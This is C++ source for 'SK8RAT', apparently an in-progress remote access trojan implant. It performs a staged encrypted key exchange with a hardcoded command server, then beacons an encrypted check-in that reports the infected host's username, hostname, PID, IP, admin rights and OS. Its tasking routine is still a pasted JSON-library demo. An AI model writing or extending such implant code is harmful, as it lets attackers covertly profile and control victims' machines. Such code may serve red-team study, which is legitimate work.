#include "CommandControl.h"
#include "sodium/sodium.h"
#pragma comment (lib,"sodium/libsodium")
#include "base64.h"
#include "Helper.h"
#include "json.hpp"
#include <atlconv.h>
using json = nlohmann::json;

void SK8RAT_EKE(unsigned char * &symmetrickey, std::string &sessioncookie) 
{
	// Variables we want to pass in eventually: ip/hostname, port, stage0 uri, stage1 uri, stage2 uri, stage3 uri, beacon uri
	// listener_id, symetric key, sleep, jitter
	std::string server_ip = "192.168.1.50";
	std::string stage0_uri = "/stage0";
	std::string stage1_uri = "/stage1";
	std::string stage2_uri = "/stage2";
	std::string stage3_uri = "/firstcheckin";
	std::string beacon_uri = "/beaconing";
	int server_port = 5000;
	int listener_id = 1;
	int sleep = 1;
	int jitter = 10;

	// Generate shared symetric key (eventually hardcode this)
	unsigned char sharedkey[crypto_secretbox_KEYBYTES];
	crypto_secretbox_keygen(sharedkey);

	// Generate asymetric key pair
	unsigned char client_publickey[crypto_box_PUBLICKEYBYTES];
	unsigned char client_privatekey[crypto_box_SECRETKEYBYTES];
	crypto_box_keypair(client_publickey, client_privatekey);

	// Generate GUID for all further requests
	GUID guid;
	CoCreateGuid(&guid);
	OLECHAR* guidString;
	StringFromCLSID(guid, &guidString);
	USES_CONVERSION;
	std::string sguid_temp = OLE2CA(guidString);
	std::string sguid = sguid_temp.substr(1, sguid_temp.size() - 2);
	::CoTaskMemFree(guidString);
	
	// Prepare nonce for confidentiality
	unsigned char nonce[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce, sizeof nonce);

	// Generate ciphertext
	int ciphertext_len = crypto_secretbox_MACBYTES + crypto_box_PUBLICKEYBYTES;
	unsigned char* ciphertext = new unsigned char[ciphertext_len]; //USE DELETE() WHEN COMPLETE
	int generate_cipher = crypto_secretbox_easy(ciphertext, client_publickey, crypto_box_PUBLICKEYBYTES, nonce, sharedkey);
	
	// Prepare stage0 message + POST to server
	std::string ciphertext_b64 = base64_encode(ciphertext, ciphertext_len);
	std::string sharedkey_b64 = base64_encode(sharedkey, crypto_secretbox_KEYBYTES);
	std::string nonce_b64 = base64_encode(nonce, crypto_secretbox_NONCEBYTES);
	std::string send_stage0 = sguid + ":" + sharedkey_b64 + ":" + nonce_b64 + ":" + ciphertext_b64;
	
	// Send to server, obtain response
	std::string server_response = "";
	agent_post(server_ip, server_port, stage0_uri, send_stage0, server_response);
	
	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response.at(0) == '"')
	{
		server_response.erase(0, 1);
		server_response.erase(server_response.find('"'));
	}

	// Recieve response and decrypt (may want to loop this for more resilient staging?)
	std::string sessionkey_encrypted = base64_decode(server_response);
	const unsigned char* csessionkey_encrypted = (const unsigned char *)sessionkey_encrypted.c_str();
	unsigned char* sessionkey = new unsigned char[sizeof(sessionkey_encrypted)]; //USE DELETE() WHEN COMPLETE
	if (crypto_box_seal_open(sessionkey, csessionkey_encrypted, size(sessionkey_encrypted), client_publickey, client_privatekey) != 0) {
		printf("session key decryption failed :(\n");
		return; 
	}

	// Generate 4 random bytes for challenge-response
	unsigned char client_challenge[4];
	randombytes_buf(client_challenge, sizeof client_challenge);

	// Prepare nonce for confidentiality
	unsigned char nonce2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce2, sizeof nonce2);

	// Generate ciphertext
	int ciphertext_len2 = crypto_secretbox_MACBYTES + sizeof client_challenge;
	unsigned char* ciphertext2 = new unsigned char[ciphertext_len2]; //USE DELETE() WHEN COMPLETE
	int generate_cipher2 = crypto_secretbox_easy(ciphertext2, client_challenge, sizeof client_challenge, nonce2, sessionkey);

	//Prepare /stage1 message
	std::string ciphertext2_b64 = base64_encode(ciphertext2, ciphertext_len2);
	std::string nonce2_b64 = base64_encode(nonce2, crypto_secretbox_NONCEBYTES);
	std::string send_stage1 = sguid + ":" + nonce2_b64 + ":" + ciphertext2_b64;

	//POST challenge response to /stage1
	std::string server_response2 = "";
	agent_post(server_ip, server_port, stage1_uri, send_stage1, server_response2);
	
	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response2.at(0) == '"')
	{
		server_response2.erase(0, 1);
		server_response2.erase(server_response2.find('"'));
	}

	// Parse server response K[client_challenge+server_challenge]
	std::string delimiter = ":";
	std::string nonce3 = base64_decode(server_response2.substr(0, server_response2.find(delimiter)));
	std::string ciphertext3 = base64_decode(server_response2.substr(server_response2.find(":") + 1));
	const unsigned char* cnonce3 = (const unsigned char *)nonce3.c_str();
	const unsigned char* cciphertext3 = (const unsigned char *)ciphertext3.c_str();

	// Decrypt server response with sessionkey
	unsigned char client_server_challenge[8];
	if (crypto_secretbox_open_easy(client_server_challenge, cciphertext3, size(ciphertext3), cnonce3, sessionkey) != 0) {
		printf("challenge-response decryption failed :(\n");
		return;
	}

	// Parse client_server_challenge
	unsigned char client_challenge_returned[4];
	unsigned char server_challenge[4];
	memcpy(client_challenge_returned, client_server_challenge, 4);
	memcpy(server_challenge, client_server_challenge + 4, 4);

	// Compare client_challenge and client_challenge_returned
	if (memcmp(client_challenge, client_challenge_returned, 4))
	{
		printf("client challenge doesn't match, potential MITM!!!\n");
		return;
	}

	// Prepare nonce for confidentiality
	unsigned char nonce_stage2[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage2, sizeof nonce_stage2);

	// Generate ciphertext K[server_challenge] to POST to stage2
	int ciphertext_stage2_len = crypto_secretbox_MACBYTES + sizeof server_challenge;
	unsigned char* ciphertext_stage2 = new unsigned char[ciphertext_stage2_len]; //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage2 = crypto_secretbox_easy(ciphertext_stage2, server_challenge, sizeof server_challenge, nonce_stage2, sessionkey);
	
	// Prepare stage2 message
	std::string ciphertext_stage2_b64 = base64_encode(ciphertext_stage2, ciphertext_stage2_len);
	std::string nonce_stage2_b64 = base64_encode(nonce_stage2, crypto_secretbox_NONCEBYTES);
	std::string send_stage2 = sguid + ":" + nonce_stage2_b64 + ":" + ciphertext_stage2_b64;

	// POST K[server_challenge] to /stage2
	std::string server_response3 = "";
	agent_post(server_ip, server_port, stage2_uri, send_stage2, server_response3);
	
	// If server response is 0, exit
	if (server_response3 == "0\n")
	{
		printf("server challenge doesn't match, potential MITM!!\n");
		return;
	}

	// Clean " at beginning and end bc flask ... also cleans \n
	if (server_response3.at(0) == '"')
	{
		server_response3.erase(0, 1);
		server_response3.erase(server_response3.find('"'));
	}

	// Parse server response
	std::string nonce4 = base64_decode(server_response3.substr(0, server_response3.find(delimiter)));
	std::string ciphertext4 = base64_decode(server_response3.substr(server_response3.find(":") + 1));
	const unsigned char* cnonce4 = (const unsigned char *)nonce4.c_str();
	const unsigned char* cciphertext4 = (const unsigned char *)ciphertext4.c_str();
	
	// Decode implant's unique session cookie
	unsigned char session_cookie[15];
	if (crypto_secretbox_open_easy(session_cookie, cciphertext4, size(ciphertext4), cnonce4, sessionkey) != 0) {
		printf("session_cookie decryption failed :(\n");
		return;
	}
	std::stringstream temp;
	temp << session_cookie;
	std::string ssessioncookie = temp.str();

	// Create check-in message
	json j;
	j["name"] = nullptr;
	j["guid"] = sguid;
	j["username"] = get_username();
	j["hostname"] = get_computername();
	j["pid"] = get_pid();
	j["internal_ip"] = get_internalip();
	j["external_ip"] = nullptr;
	j["admin"] = is_admin();
	j["os"] = get_version();
	j["task"] = nullptr;
	j["task_output"] = nullptr;
	j["listener_id"] = listener_id;
	j["server_ip"] = server_ip;
	j["sleep"] = sleep;
	j["jitter"] = jitter;
	j["session_key"] = nullptr;
	j["client_challenge"] = nullptr;
	j["server_challenge"] = nullptr;
	j["session_cookie"] = ssessioncookie;
	j["last_seen"] = get_utctime();
	std::string sj = j.dump();
	int sj_size = sj.size();
	const unsigned char * sk8rat_checkin = reinterpret_cast<const unsigned char *> (sj.c_str());

	// Prepare nonce for confidentiality
	unsigned char nonce_stage3[crypto_secretbox_NONCEBYTES];
	randombytes_buf(nonce_stage3, sizeof nonce_stage3);

	// Generate ciphertext for sk8rat first check-in
	int ciphertext_stage3_len = crypto_secretbox_MACBYTES + sj_size;
	unsigned char* ciphertext_stage3 = new unsigned char[ciphertext_stage3_len]; //USE DELETE() WHEN COMPLETE
	int generate_ciphertext_stage3 = crypto_secretbox_easy(ciphertext_stage3, sk8rat_checkin, sj_size, nonce_stage3, sessionkey);

	// Prepare first check-in message
	std::string ciphertext_stage3_b64 = base64_encode(ciphertext_stage3, ciphertext_stage3_len);
	std::string nonce_stage3_b64 = base64_encode(nonce_stage3, crypto_secretbox_NONCEBYTES);
	std::string send_stage3 = nonce_stage3_b64 + ":" + ciphertext_stage3_b64;

	// POST K[sk8rat_checkin] to /beaconingurl
	std::string server_response4 = "";
	agent_post_cookie(server_ip, server_port, stage3_uri, ssessioncookie, send_stage3, server_response4);

	// Pass necessary variables out of function
	symmetrickey = sessionkey;
	sessioncookie = ssessioncookie;

	// Clean-up dynamically allocated heap
	delete(ciphertext);
	delete(sessionkey);
	delete(ciphertext2);
	delete(ciphertext_stage2);
	delete(ciphertext_stage3);

	// Sleep then return
	SleepJitter(sleep, jitter);
}

void SK8RAT_tasking(unsigned char * symmetrickey, std::string sessioncookie)
{
	// create an empty structure (null)
	json j;

	// add a number that is stored as double (note the implicit conversion of j to an object)
	j["pi"] = 3.141;

	// add a Boolean that is stored as bool
	j["happy"] = true;

	// add a string that is stored as std::string
	j["name"] = "Niels";

	// add another null object by passing nullptr
	j["nothing"] = nullptr;

	// add an object inside the object
	j["answer"]["everything"] = 42;

	// add an array that is stored as std::vector (using an initializer list)
	j["list"] = { 1, 0, 2 };

	// add another object (using an initializer list of pairs)
	j["object"] = { {"currency", "USD"}, {"value", 42.99} };

	// instead, you could also write (which looks very similar to the JSON above)
	json j2 = {
	  {"justin", 1234},
	  {"fucking", true},
	  {"rocks", "Niels"},
	  {"yeah", nullptr},
	};
	std::string j_string = j.dump();
	std::string j2_string = j2.dump();
	printf("%s\n%s\n", j_string.c_str(), j2_string.c_str());
	json j3 = j;
	j3.update(j2);
	std::string j3_string = j3.dump();
	printf("%s\n", j3_string.c_str());
}

int main(int argc, char **argv)
{
	
	// Perform encrypted key exchange and save final symmetric key and session cookie
	unsigned char * symmetrickey = NULL;
	std::string sessioncookie = "";
	SK8RAT_EKE(symmetrickey, sessioncookie); 
	
	// Begin tasking loop
	SK8RAT_tasking(symmetrickey, sessioncookie);
	

	


	//DEBUG ONLY
	system("pause");
	return 0;
}